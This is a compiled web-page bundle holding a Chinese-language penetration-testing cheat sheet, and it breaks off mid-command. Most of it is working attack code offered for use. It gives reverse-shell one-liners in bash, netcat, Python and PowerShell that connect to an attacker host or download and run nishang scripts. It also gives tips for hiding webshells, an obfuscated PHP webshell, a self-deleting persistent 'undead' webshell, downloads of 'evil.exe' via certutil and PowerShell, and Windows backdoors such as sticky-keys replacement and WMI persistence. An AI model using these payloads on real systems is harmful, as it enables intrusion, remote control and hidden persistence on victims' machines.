(window.webpackJsonp=window.webpackJsonp||[]).push([[57],{811:function(s,t,a){"use strict";a.r(t);var n=a(102),e=Object(n.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h2",{attrs:{id:"反弹shell"}},[s._v("反弹Shell "),a("a",{staticClass:"header-anchor",attrs:{href:"#反弹shell"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("攻击者VPS监听")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" -lvp "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("9999")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("BASH")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("/bin/bash -i "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&>")]),s._v(" /dev/tcp/192.168.0.198/9999 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("&1")]),s._v("\n\n/bin/sh -i "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&>")]),s._v(" /dev/tcp/192.168.0.198/9999 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("&1")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[a("strong",[s._v("Netcat")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" -e /bin/bash "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".0.198 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("9999")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("PowerShell")])]),s._v(" "),a("p",[s._v("将ps1脚本先放到VPS上")]),s._v(" "),a("div",{staticClass:"language-powershell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-powershell"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("##TCP")]),s._v("\npowershell "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("IEX")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("New-Object")]),s._v(" Net"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("WebClient"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("DownloadString"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("Invoke-PowerShellTcp")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Reverse "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("IPAddress 192"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("168"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("198 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("port 9999\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("##UDP")]),s._v("\npowershell "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("IEX")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("New-Object")]),s._v(" Net"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("WebClient"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("DownloadString"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'http://192.168.159.134/nishang/Shells/Invoke-PowerShellUdp.ps1'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("Invoke-PowerShellUdp")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Reverse "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("IPAddress 10"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("1 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("port 53\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("##ICMP")]),s._v("\npowershell "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("IEX")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("New-Object")]),s._v(" Net"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("WebClient"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("DownloadString"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'http://192.168.159.134/nishang/Shells/Invoke-PowerShellIcmp.ps1'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("Invoke-PowerShellIcmp")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("IPAddress 192"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("168"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("159"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("134\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("p",[a("strong",[s._v("Python")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("python -c "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect"),a("span",{pre:!0,attrs:{class:"token variable"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("((")]),s._v('"'),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.1")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".1")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".1")]),s._v('"'),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("9999")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("))")])]),s._v(';os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'')]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("PHP")])]),s._v(" "),a("p",[s._v("https://github.com/pentestmonkey/php-reverse-shell")]),s._v(" "),a("p",[s._v("PHP 交互式反弹Shell，修改反弹IP后上传到目标访问一下即可。")]),s._v(" "),a("h2",{attrs:{id:"获取webshell"}},[s._v("获取Webshell "),a("a",{staticClass:"header-anchor",attrs:{href:"#获取webshell"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("隐藏WebShell")])]),s._v(" "),a("blockquote",[a("p",[s._v("1、仿照已存在的文件起名字，隐藏在深层目录， 创建…目录隐藏shell\n2、利用静态文件，比如图片马然后利用 .htaccess 进行解析\n3、修改WebShell时间戳为同目录下其它文件相同的时间")])]),s._v(" "),a("p",[a("strong",[s._v("快速应用")])]),s._v(" "),a("p",[s._v("直接上冰蝎加密shell，或哥斯拉内存马（基于tomcat）\n冰蝎：https://github.com/rebeyond/Behinder\n哥斯拉：https://github.com/BeichenDream/Godzilla")]),s._v(" "),a("p",[a("strong",[s._v("PHP-Webshell")])]),s._v(" "),a("p",[s._v("文件免杀（Apache、Nginx特性）cmd")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("assert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("implode")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("reset")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("get_defined_vars")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//返回由所有已定义变量所组成的数组 ")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("Use")]),s._v(" age：cmd"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("php"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("?")]),s._v("a"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("system")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("whoami"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n适用于"),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("PHP")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("7.1")]),s._v(" ，因为在"),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("PHP7")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("之后assert被弃用了、"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("7.2")]),s._v(" create_function被弃用了\n")])])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[a("strong",[s._v("内存马")])]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("//nodie_shell.php\n"),a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("\n\t"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("set_time_limit")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//设置脚本最大执行时间,0 即为无时间限制")]),s._v("\n\t"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ignore_user_abort")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token boolean constant"}},[s._v("true")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//设置与客户机断开不终止脚本的执行")]),s._v("\n\t"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("unlink")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("__FILE__")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//删除文件自身")]),s._v("\n\t"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$file")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'/var/www/html/.shell.php'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\t\n\t"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$code")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v('\'<?php if(md5($_POST["pass"])=="cdd7b7420654eb16c1e1b748d5b7c5b8"){@system($_POST[a]);}?>\'')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\t"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("while")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n\t\t"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("file_put_contents")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$file")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$code")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//写shell文件")]),s._v("\n\t\t"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("system")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'touch -m -d \"2014-10-31 13:50:11\" .shell.php'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//修改时间戳")]),s._v("\n\t\t"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("usleep")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1000")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//以指定的微秒数延缓程序的执行")]),s._v("\n\t"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br")])]),a("p",[a("strong",[s._v("杀死PHP不死马")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("、高权限，重启服务\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("service")]),s._v(" apache2 restart\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("service")]),s._v(" php restart\n\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("、低权限，杀掉所有进程\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("kill")]),s._v(" -9 -1\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("killall")]),s._v(" apache2\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("hr"),s._v(" "),a("h2",{attrs:{id:"文件传输"}},[s._v("文件传输 "),a("a",{staticClass:"header-anchor",attrs:{href:"#文件传输"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("Python搭建简单的HTTP服务")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("python -m http.server "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("80")]),s._v("\n\npython2 -m SimpleHTTPServer "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("80")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[a("strong",[s._v("SCP")])]),s._v(" "),a("p",[s._v("上传")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("scp")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("123")]),s._v(".txt root@10.10.10.10:~/123.txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("下载")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("scp")]),s._v(" root@210.210.210.10:/home/root/1.txt ./1.txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("Bash Download")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#服务器监听")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" -lp "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1337")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("666")]),s._v(".txt\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#客户端下载")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("bash")]),s._v(" -c "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'cat < /dev/tcp/10.10.10.10/1337 > 666.txt'")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[a("strong",[s._v("certutil 下载")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("certutil -urlcache -split -f http://10.10.10.10:80/npc.exe\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("PowerShell 下载")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("powershell "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("new-object System.Net.WebClient"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(".DownloadFile"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'http://192.168.174.1:1234/evil.txt'")]),s._v(","),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'evil.exe'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("Windows查找文件")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("dir")]),s._v(" /s *.jsp\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" /r D:"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("developer %i "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("*.jspx"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("do")]),s._v(" @echo %i\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("hr"),s._v(" "),a("h2",{attrs:{id:"系统后门"}},[s._v("系统后门 "),a("a",{staticClass:"header-anchor",attrs:{href:"#系统后门"}},[s._v("#")])]),s._v(" "),a("h3",{attrs:{id:"windows"}},[s._v("Windows "),a("a",{staticClass:"header-anchor",attrs:{href:"#windows"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("Schtasks后门")])]),s._v(" "),a("p",[s._v("Schtasks.exe能够在本地或远程计算机上创建，删除，查询，更改，运行和结束计划任务")]),s._v(" "),a("p",[s._v("不带参数运行Schtasks.exe会显示每个已注册任务的状态和下一次运行时间。")]),s._v(" "),a("p",[a("strong",[s._v("wmi后门")])]),s._v(" "),a("p",[s._v("WMI后门使用了WMI的两个特征："),a("strong",[s._v("无文件")]),s._v("和"),a("strong",[s._v("无进程")]),s._v("（需要管理员权限运行）。")]),s._v(" "),a("p",[a("strong",[s._v("原理是")]),s._v("：将代码加密存储与WMI中，即无文件；调用PowerShell执行后门程序，执行后进程消失，即无进程。")]),s._v(" "),a("p",[a("strong",[s._v("在Empire中使用Invoke-WMI模块")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("usemodule powershell/persistence/elevated/wmi\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#设置参数run")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("blockquote",[a("p",[a("strong",[s._v("检查后门")]),s._v("：使用微软提供的工具"),a("code",[s._v("Autoruns")]),s._v("：")]),s._v(" "),a("p",[s._v("https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns")])]),s._v(" "),a("p",[a("strong",[s._v("DLL劫持后门")])]),s._v(" "),a("p",[s._v("DLL劫持原理就是使用 "),a("code",[s._v("loadlibrary")]),s._v(" 动态加载DLL")]),s._v(" "),a("p",[s._v("DLL劫持工具："),a("a",{attrs:{href:"https://github.com/anhkgg/SuperDllHijack",target:"_blank",rel:"noopener noreferrer"}},[s._v("SuperDllHijack"),a("OutboundLink")],1)]),s._v(" "),a("p",[a("strong",[s._v("映像劫持shift后门")])]),s._v(" "),a("p",[a("strong",[s._v("替换sethc.exe为cmd.exe")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("CD C:"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("windows"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("system32\ncacls sethc.exe /t /e /G Administrators:f\ncacls cmd.exe /t /e /G Administrators:f\nren sethc.exe aaa.exeren cmd.exe sethc.exe\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#恢复")]),s._v("\nren sethc.exe cmd.exeren aaa.exe sethc.exe\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v("连按5下Shift弹出cmd窗口")]),s._v(" "),a("blockquote",[a("p",[a("strong",[s._v("检查后门")]),s._v("：连续按5下弹出cmd窗口（当然还有其它放大镜讲述人等）")])]),s._v(" "),a("p",[s._v("木马加入开机启动项")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("reg 